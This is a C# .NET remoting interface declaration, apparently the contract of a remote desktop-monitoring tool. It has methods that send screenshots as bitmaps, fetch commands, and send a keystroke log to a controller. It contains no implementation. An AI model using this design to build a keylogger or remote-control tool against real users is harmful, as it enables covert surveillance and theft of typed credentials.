using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.IO;

namespace RemotingInterface
{
    public interface DesktopInterface
    {
        void HelloMethod(String name);
        void GoodbyeMethod();
        void SendBitmap(MemoryStream memoryStream);
        string GetCommands();

        void SendKeystrokes(String keylog);
    }
}
